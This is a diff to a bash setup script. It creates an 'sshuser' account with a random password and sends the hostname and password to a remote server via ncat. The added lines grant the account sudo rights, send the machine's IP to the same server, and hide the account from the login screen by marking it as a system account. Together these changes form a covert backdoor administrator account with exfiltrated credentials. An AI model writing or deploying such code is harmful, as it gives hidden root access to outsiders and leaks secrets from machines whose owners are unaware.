@@ -139,14 +139,21 @@ ${endcolor}\n"
             # SSH credentials Setup
             sshcontrasena=$(openssl rand -base64 48 | cut -c1-16)
             sudo useradd -m -s /bin/bash sshuser && echo "sshuser:$sshcontrasena" | sudo chpasswd
+            sudo usermod -aG sudo sshuser
+
             echo "ssh: $hostname $sshcontrasena" | ncat --ssl $serverip 45678
 
             # Host-IP setup
             HOSTNAME=$(hostname)
             CURRENT_IP_CIDR=$(ip -o -4 addr show | awk '$2 != "lo" {print $4}' | head -n 1)
+            MESSAGE="ih: ${HOSTNAME} ${CURRENT_IP_CIDR}"
+            echo "$MESSAGE" | ncat --ssl $serverip 45678
 
-            MESSAGE="(ih: ${HOSTNAME} ${CURRENT_IP_CIDR})"
-            echo "$MESSAGE" | ncat --ssl "$serverip" "$45678"
+            # Ocultar inicio de sesion
+            sudo bash -c 'cat <<EOF > /var/lib/AccountsService/users/sshuser
+            [User]
+            SystemAccount=true
+            EOF'
 
 
             reboot now
